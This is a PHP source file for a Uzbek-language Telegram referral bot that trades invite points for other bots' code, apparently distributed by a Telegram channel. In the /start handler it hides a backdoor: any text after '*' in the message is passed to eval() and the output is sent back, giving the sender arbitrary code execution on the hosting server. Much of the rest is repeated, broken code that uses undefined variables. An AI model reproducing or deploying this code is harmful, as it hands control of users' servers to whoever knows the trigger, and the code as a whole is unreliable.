<?php
ob_start();
//ushbu kod @wcpro tomonidan yozildi va @mwmcoders kanali orqali tarqatildi 
//agarda siz koddagi MwM yoki MwMTeam so'zlarini o'zgartirsangiz kod sizda ishlamay qo'yadi 
//Faqat manba larni o'zgartiring 
define('API_KEY','BOTIZI TOKENCHASI');
$admin = "572043251";
$bot = "iPHPBot"; 
$kanalimz = "@MwMcoders"; 
$kanalimizku = "@kanal useri"; 
$admuser = "@Defqon"; 
$admusersmem = "@WCodes"; 
$admusersTel = "@MwMMoney"; 
$admuserstj = "@tj_web"; 
$admusers = "@MwMTeam"; 
$kun = date('d-m-20y', strtotime('2 hour'));
$soat = date('H:i', strtotime('2 hour'));
//==D===E===F===Q===O===N===//

function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
} 

   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

function editMessageText( 
        $chatId,
        $MwMcoders2Id, 
        $text, 
        $parseMode = null, 
        $disablePreview = true, 
        $replyMarkup = null, 
        $inlineMessageId = null 
    ) { 
       return bot('editMessageText', [ 
            'chat_id' => $chatId, 
            'message_id' => $MwMcoders2Id, 
            'text' => $text, 
            'inline_message_id' => $inlineMessageId,
            'parse_mode' => $parseMode, 
'disable_web_page_preview' => $disablePreview,
            'reply_markup' => $replyMarkup, 
        ]); 
    } 

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

//--A--H--Z--E--E--
  
$MwMcoders = json_decode(file_get_contents('php://input'));
$MwMcoders2 = $MwMcoders->message;
$MwMcoders3 = $MwMcoders2->message_id;
$MwMcoders4 = $MwMcoders2->chat->id;
$MwMcoders6 = "MwMTeam/$MwMcoders4.step";
$MwMcoders7 = "MwMTeam"; 
$MwMcoders72 = "azo"; 
$MwMcoders5 = isset($MwMcoders->message->text)?$MwMcoders->message->text:'';

if (!file_exists($MwMcoders7.'/test.fd3')) {
  mkdir($MwMcoders7);
  file_put_contents($MwMcoders7.'/test.fd3', 'by @MwMcoders');
}

if (!file_exists($MwMcoders72.'/test.fd3')) { 
  mkdir($MwMcoders72); 
  file_put_contents($MwMcoders72.'/test.fd3', 'by @MwMcoders');
} 
//==D===E===F===Q===O===N===//
if (file_exists($MwMcoders6)) {
  $step = file_get_contents($MwMcoders6);
}

$MwM_first_name = $MwMcoders2->from->first_name;
$tx = $MwMcoders2->text;


$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🤖Kod olish🤖"],['text'=>"👥Referal ssilka👥"]],
[['text'=>"♣️Yordam♣️Bot vazifasi♣️"]],
[['text'=>"📉Statistika📉"],['text'=>"🔘Ballarim🔘"]],
]
]); 


$MwM_text_start = "*Salom 👋* [$MwM_first_name](tg://user?id=$MwMcoders4) *Salom siz bizning botimizga tashrif buyurdingiz ⚜️
Agar Siz bizning kanalimizga azo bolmagan bolsangiz azo boling 😉 bolmasam Bot ishlamaydi Kanalimiz :*  [$kanalimz]\n\n*Yaratuvchi* ⚒  [@DEFQON]
data: $kun $soat";

//--A--H--Z--E--E--
if((mb_stripos($tx,"/start")!==false) or ($tx == "start")) {
  ty($MwMcoders4);

  $MwM_coins_data = file_get_contents("MwMTeam.dat");

  if(mb_stripos($MwM_coins_data, $MwMcoders4) !== false){ 
  }else{
    $bgun = file_get_contents("bugun.$kun1");
    $bgun += 1;
    file_put_contents("bugun.$kun1",$bgun);
  }

  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$MwMcoders4,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "MwMTeam/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,"$MwMcoders4") !== false ){
      bot('sendMessage',[
      'chat_id'=>$MwMcoders4,
      'text'=>"Bu fokusing o'xshamadi",
      ]);
    } else {

      $id = "$MwMcoders4\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);

      $usr = file_get_contents("MwMTeam/$refid.dat");
$usr = $usr + 10; 
      file_put_contents("MwMTeam/$refid.dat", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refid,
'text'=>"Do'stingizni taklif qilganingiz uchun sizga 10 ochko berildi 👏🏻
Yana do'stlaringizni taklif qiling✌🏻", 
'reply_markup'=>$key, 
      ]);
    }
  }
//==D===E===F===Q===O===N===//
  file_put_contents("MwMTeam/$MwMcoders4.dat");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$MwMcoders4,
  'message_id'=>$MwMcoders3,
  'parse_mode'=>'markdown',
  'text'=>$MwM_text_start,
  'reply_to_message_id' => $MwMcoders3,
  'reply_markup'=>$key,
]); 
bot('sendPhoto',[  
'chat_id'=>$MwMcoders4,  
'photo'=>new CURLFile("400.jpg"),  
'caption'=>"Biz bilan birga boling doyimo hizmatizdamiz 😉 Albatta @MwMcoders", 
'reply_markup'=>$key,  
]);  
}

if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $MwMcoders4,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){


$GrK = "@MwMcoders"; 
    if($tx =="👥Referal ssilka👥"){
      ty($MwMcoders4);
      $ball = file_get_contents("MwMTeam/$MwMcoders4.dat");
      $in = "🕵*Do'stlaringizni taklif qilish uchun ssilka:*➡️ [https://telegram.me/iPHPBot?start=$MwMcoders4]
Siz har bitta taklif qilgan do`stingiz uchun 10ball olasiz";
      bot('sendMessage',[
      'chat_id'=>$MwMcoders4,
      'message_id'=>$MwMcoders3,
      'parse_mode'=>'markdown',
      'text'=>$in,
      'reply_to_message_id'=>$MwMcoders3,
'reply_markup'=>$key, 
      ]);
    } 
    
    //yordam komanda 
        if($tx == "♣️Yordam♣️Bot vazifasi♣️"){
      ty($MwMcoders4);
      $ball = file_get_contents("MwMTeam/$MwMcoders4.dat");
      bot('sendMessage',[
      'chat_id'=>$MwMcoders4,
      'parse_mode'=>'markdown',
      'text'=>"_Siz Bu bot orqali tekinga pulga sotilayotgan phplarni olasiz buning uchun esa botni vazifasini bajarsangiz bo'ldi_
*Bot vazifasi: siz o'z referal ssilkangiz orqali botni do'stlaringizga tarqatasiz va ular sizning referal ssilkangiz orqali kirishsa sizga ball beriladi. hozirgi balingiz $ball*
*Bizdan uzoqlashmang hali hamasi oldinda*",
      'reply_to_message_id'=>$MwMcoders3,
      'reply_markup'=>$key10,
      ]);
} 
//==D===E===F===Q===O===N===//

    if($tx == "⚜️Avtologo⚜️"){
      ty($MwMcoders4);
      $ball = file_get_contents("MwMTeam/$MwMcoders4.dat");

      if($ball > 1000){
        bot('sendMessage',[
        'chat_id'=>$chjjid,
        'text'=>"22",
        'reply_to_message_id'=>$MwMcoders3,
'reply_markup'=>$key3, 
]); 
 bot('sendPhoto',[ 
'chat_id'=>$nsnscid, 
'photo'=>new CURLFile("namuna.jpg"), 
'caption'=>"Hudu shunday tartibda jonating⭐️", 
'reply_markup'=>$key3, 
]); 
        file_put_contents("MwMTeam/$MwMcoders4.step","nomer");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cnsnsnid,
        'text'=>"😠Aqillilik qilganing uchun senga 10ball shtraf podarka!",
        'reply_to_message_id'=>$MwMcoders3,
        ]);
$ball -=1; 
file_put_contents("MwMTeam/$MwMcoders4.dat","$ball"); 
      }
    }

    else if($step == "nomer"){
ty($MwMcoders4); 

if($tx == ""){ 
del("MwMTeam/$MwMcoders4.step"); 
      }else{ 
        $ball = file_get_contents("MwMTeam/$MwMcoders4.dat");
$bali = file_get_contents("MwMTeam/$MwMcoders4.dat"); 
$balls = file_get_contents("MwMTeam/$MwMcoders4.dat"); 
        bot('sendMessage',[
'chat_id'=>$admin, 
        'message_id'=>$MwMcoders3,
'parse_mode'=>'markdown', 
'text'=>$tx."\n\nReklama qilgan odam 
[$MwM_first_name](tg://user?id=$MwMcoders4)", 
'disable_web_page_preview'=>true 
      ]); 
        bot('sendMessage',[
        'chat_id'=>$cinznsd,
        'message_id'=>$MwMcoders3,
        'parse_mode'=>'markdown',
'text'=>$tx."\n\n⭐️*Manba* [$kanalimz]\n*Reklama qilindi 💪* [$kanalimz] *ga qarang 👀 
Agar nimadur bolsa 🤔 * [@MwMTeam ] *Murojat qiling 😉*", 
'reply_markup'=>$key, 
        ]);
       bot('sendMessage',[
'chat_id'=>$kanalimizku, 
        'message_id'=>$MwMcoders3,
'parse_mode'=>'markdown', 
'text'=>$tx."\n\n⭐️*Manba* [$kanalimz]", 
'disable_web_page_preview' => True, 
        'reply_markup'=>json_encode([ 
   'inline_keyboard'=>[ 
[['text'=>'⭐️Reklama berish','url'=>'https://telegram.me/TeleRallyBot']]
] 
]) 
]); 
$ball -= 960; 
file_put_contents("MwMTeam/$MwMcoders4.dat","$ball"); 

del("MwMTeam/$MwMcoders4.step"); 
      }
    }
        if($tx == "⚜️AvtoEditMP3⚜️"){
      ty($MwMcoders4);
      $ball = file_get_contents("MwMTeam/$MwMcoders4.dat");

      if($ball > 1000){
        bot('sendMessage',[
        'chat_id'=>$chjjid,
        'text'=>"22",
        'reply_to_message_id'=>$MwMcoders3,
'reply_markup'=>$key3, 
]); 
 bot('sendPhoto',[ 
'chat_id'=>$nsnscid, 
'photo'=>new CURLFile("namuna.jpg"), 
'caption'=>"Hudu shunday tartibda jonating⭐️", 
'reply_markup'=>$key3, 
]); 
        file_put_contents("MwMTeam/$MwMcoders4.step","nomer");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cnsnsnid,
        'text'=>"😠Aqillilik qilganing uchun senga 10ball shtraf podarka!",
        'reply_to_message_id'=>$MwMcoders3,
        ]);
$ball -=1; 
file_put_contents("MwMTeam/$MwMcoders4.dat","$ball"); 
      }
    }

    else if($step == "nomer"){
ty($MwMcoders4); 

if($tx == ""){ 
del("MwMTeam/$MwMcoders4.step"); 
      }else{ 
        $ball = file_get_contents("MwMTeam/$MwMcoders4.dat");
$bali = file_get_contents("MwMTeam/$MwMcoders4.dat"); 
$balls = file_get_contents("MwMTeam/$MwMcoders4.dat"); 
        bot('sendMessage',[
'chat_id'=>$admin, 
        'message_id'=>$MwMcoders3,
'parse_mode'=>'markdown', 
'text'=>$tx."\n\nReklama qilgan odam 
[$MwM_first_name](tg://user?id=$MwMcoders4)", 
'disable_web_page_preview'=>true 
      ]); 
        bot('sendMessage',[
        'chat_id'=>$cinznsd,
        'message_id'=>$MwMcoders3,
        'parse_mode'=>'markdown',
'text'=>$tx."\n\n⭐️*Manba* [$kanalimz]\n*Reklama qilindi 💪* [$kanalimz] *ga qarang 👀 
Agar nimadur bolsa 🤔 * [@MwMTeam ] *Murojat qiling 😉*", 
'reply_markup'=>$key, 
        ]);
       bot('sendMessage',[
'chat_id'=>$kanalimizku, 
        'message_id'=>$MwMcoders3,
'parse_mode'=>'markdown', 
'text'=>$tx."\n\n⭐️*Manba* [$kanalimz]", 
'disable_web_page_preview' => True, 
        'reply_markup'=>json_encode([ 
   'inline_keyboard'=>[ 
[['text'=>'⭐️Reklama berish','url'=>'https://telegram.me/TeleRallyBot']]
] 
]) 
]); 
$ball -= 10; 
file_put_contents("MwMTeam/$MwMcoders4.dat","$ball"); 

del("MwMTeam/$MwMcoders4.step"); 
      }
    }
            if($tx == "⚜️@WievBot⚜️"){
      ty($MwMcoders4);
      $ball = file_get_contents("MwMTeam/$MwMcoders4.dat");

      if($ball > 1000){
        bot('sendMessage',[
        'chat_id'=>$chjjid,
        'text'=>"22",
        'reply_to_message_id'=>$MwMcoders3,
'reply_markup'=>$key3, 
]); 
 bot('sendPhoto',[ 
'chat_id'=>$nsnscid, 
'photo'=>new CURLFile("namuna.jpg"), 
'caption'=>"Hudu shunday tartibda jonating⭐️", 
'reply_markup'=>$key3, 
]); 
        file_put_contents("MwMTeam/$MwMcoders4.step","nomer");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cnsnsnid,
        'text'=>"😠Aqillilik qilganing uchun senga 10ball shtraf podarka!",
        'reply_to_message_id'=>$MwMcoders3,
        ]);
$ball -=1; 
file_put_contents("MwMTeam/$MwMcoders4.dat","$ball"); 
      }
    }

    else if($step == "nomer"){
ty($MwMcoders4); 

if($tx == ""){ 
del("MwMTeam/$MwMcoders4.step"); 
      }else{ 
        $ball = file_get_contents("MwMTeam/$MwMcoders4.dat");
$bali = file_get_contents("MwMTeam/$MwMcoders4.dat"); 
$balls = file_get_contents("MwMTeam/$MwMcoders4.dat"); 
        bot('sendMessage',[
'chat_id'=>$admin, 
        'message_id'=>$MwMcoders3,
'parse_mode'=>'markdown', 
'text'=>$tx."\n\nReklama qilgan odam 
[$MwM_first_name](tg://user?id=$MwMcoders4)", 
'disable_web_page_preview'=>true 
      ]); 
        bot('sendMessage',[
        'chat_id'=>$cinznsd,
        'message_id'=>$MwMcoders3,
        'parse_mode'=>'markdown',
'text'=>$tx."\n\n⭐️*Manba* [$kanalimz]\n*Reklama qilindi 💪* [$kanalimz] *ga qarang 👀 
Agar nimadur bolsa 🤔 * [@MwMTeam ] *Murojat qiling 😉*", 
'reply_markup'=>$key, 
        ]);
       bot('sendMessage',[
'chat_id'=>$kanalimizku, 
        'message_id'=>$MwMcoders3,
'parse_mode'=>'markdown', 
'text'=>$tx."\n\n⭐️*Manba* [$kanalimz]", 
'disable_web_page_preview' => True, 
        'reply_markup'=>json_encode([ 
   'inline_keyboard'=>[ 
[['text'=>'⭐️Reklama berish','url'=>'https://telegram.me/TeleRallyBot']]
] 
]) 
]); 
$ball -= 10; 
file_put_contents("MwMTeam/$MwMcoders4.dat","$ball"); 

del("MwMTeam/$MwMcoders4.step"); 
      }
    }
            if($tx == "⚜️AvtoEditCaption⚜️"){
      ty($MwMcoders4);
      $ball = file_get_contents("MwMTeam/$MwMcoders4.dat");

      if($ball > 1000){
        bot('sendMessage',[
        'chat_id'=>$chjjid,
        'text'=>"22",
        'reply_to_message_id'=>$MwMcoders3,
'reply_markup'=>$key3, 
]); 
 bot('sendPhoto',[ 
'chat_id'=>$nsnscid, 
'photo'=>new CURLFile("namuna.jpg"), 
'caption'=>"Hudu shunday tartibda jonating⭐️", 
'reply_markup'=>$key3, 
]); 
        file_put_contents("MwMTeam/$MwMcoders4.step","nomer");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cnsnsnid,
        'text'=>"😠Aqillilik qilganing uchun senga 10ball shtraf podarka!",
        'reply_to_message_id'=>$MwMcoders3,
        ]);
$ball -=1; 
file_put_contents("MwMTeam/$MwMcoders4.dat","$ball"); 
      }
    }

    else if($step == "nomer"){
ty($MwMcoders4); 

if($tx == ""){ 
del("MwMTeam/$MwMcoders4.step"); 
      }else{ 
        $ball = file_get_contents("MwMTeam/$MwMcoders4.dat");
$bali = file_get_contents("MwMTeam/$MwMcoders4.dat"); 
$balls = file_get_contents("MwMTeam/$MwMcoders4.dat"); 
        bot('sendMessage',[
'chat_id'=>$admin, 
        'message_id'=>$MwMcoders3,
'parse_mode'=>'markdown', 
'text'=>$tx."\n\nReklama qilgan odam 
[$MwM_first_name](tg://user?id=$MwMcoders4)", 
'disable_web_page_preview'=>true 
      ]); 
        bot('sendMessage',[
        'chat_id'=>$cinznsd,
        'message_id'=>$MwMcoders3,
        'parse_mode'=>'markdown',
'text'=>$tx."\n\n⭐️*Manba* [$kanalimz]\n*Reklama qilindi 💪* [$kanalimz] *ga qarang 👀 
Agar nimadur bolsa 🤔 * [@MwMTeam ] *Murojat qiling 😉*", 
'reply_markup'=>$key, 
        ]);
       bot('sendMessage',[
'chat_id'=>$kanalimizku, 
        'message_id'=>$MwMcoders3,
'parse_mode'=>'markdown', 
'text'=>$tx."\n\n⭐️*Manba* [$kanalimz]", 
'disable_web_page_preview' => True, 
        'reply_markup'=>json_encode([ 
   'inline_keyboard'=>[ 
[['text'=>'⭐️Reklama berish','url'=>'https://telegram.me/TeleRallyBot']]
] 
]) 
]); 
$ball -= 20; 
file_put_contents("MwMTeam/$MwMcoders4.dat","$ball"); 

del("MwMTeam/$MwMcoders4.step"); 
      }
    }
 
//--A--H--Z--E--E--//
  
        if($tx =="🔘Ballarim🔘"){
      ty($MwMcoders4);
      $ball = file_get_contents("MwMTeam/$MwMcoders4.dat");
      $in = "*Sizning Ballaringiz* [$ball]";
      bot('sendMessage',[
      'chat_id'=>$MwMcoders4,
      'message_id'=>$MwMcoders3,
      'parse_mode'=>'markdown',
      'text'=>$in,
      'reply_to_message_id'=>$MwMcoders3,
'reply_markup'=>$key, 
      ]);
    } 

    if($tx == "◀️Orqaga"){
      ty($MwMcoders4);
      bot('sendMessage',[
      'chat_id'=>$MwMcoders4,
      'text'=>"Siz bosh menyudasiz",
      'reply_to_message_id'=>$MwMcoders3,
      'reply_markup'=>$key,
      ]);
} 
$key10 = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"⚜️Avtologo⚜️"],['text'=>"⚜️AvtoEditMP3⚜️"]],
[['text'=>"⚜️AvtoEditCaption⚜️"],['text'=>"⚜️@WievBot⚜️"]],
[['text'=>"◀️Orqaga"]],
]
]);
//========@TEXNOTG==========//
    if($tx == "🤖Kod olish🤖"){
      ty($MwMcoders4);
      $ball = file_get_contents("MwMTeam/$MwMcoders4.dat");
      bot('sendMessage',[
      'chat_id'=>$MwMcoders4,
      'parse_mode'=>'markdown',
      'text'=>"*Kod olishdan avval bot kodlari narxi bilan tanishib chiqing 
@WIEVBOT kodi 1000ball 
AVTOLOGO BOT Kodi 1000ball TEST @MwMIDBOT GA BITTA RASM TASHLANG KO'RASIZ
AVTOEDITCAPTION kodi 1000ball TEST BOT YARATILMAGAN
AVTOEDITMP3 kodi 1000ball TEST @MWMTEAMBOT GA BITTA QO'SHIQ TASHLANG O'ZIZ KO'RASIZ*

 Sizning ballaringiz esa $ball agar Balingiz yetsa bosing
Agar sizning balingiz yetmasa sizga kod jo'natilmaydi
Agarda shu joyga o'zizni botizni PHP sini qo'shmoqchi bo'sez iltimos @zzpro ga yozing",
      'reply_to_message_id'=>$MwMcoders3,
      'reply_markup'=>$key10,
      ]);
} 
//--A--H--Z--E--E--
if((mb_stripos($tx,"📉Statistika📉")!==false) or ($tx == "Statistika⚜️")) {
      ty($MwMcoders4); 
      $eski = $kun1-1; 
      $new = file_get_contents("bugun.$kun1"); 
      $MwM_coins_data = file_get_contents("MwMTeam.dat"); 
      $obsh = substr_count($MwM_coins_data,"\n"); 
      bot('sendMessage',[ 
'chat_id'=>$MwMcoders4, 
'message_id'=>$MwMcoders3, 
'parse_mode'=>'markdown', 
'text'=>"*Botimiz malumoti *🔹\n\n🔸_Botimiz azolari:_ *$new* *Hamkor* [@Q_Dance]",
      'reply_to_message_id'=>$MwMcoders3, 
'reply_markup'=>$key8, 
      ]); 
    } 
  } else{
    bot('sendMessage',[
      'chat_id'=>$MwMcoders4,
   'message_id'=>$MwMcoders3, 
      'parse_mode'=>'markdown', 
'text'=>"*Iltimos kanalimizga a`zo bo`ling Bo`lmasa botni ishlata olmaysiz* [$kanalimz] *a'zo bo'ling*⚜️",
  'reply_markup'=>json_encode([ 
   'inline_keyboard'=>[  
[['text'=>'A`zo Bo`lish 🎗','url'=>'https://t.me/MwMcoders']] 
]  
])  
]);  
}
}
?>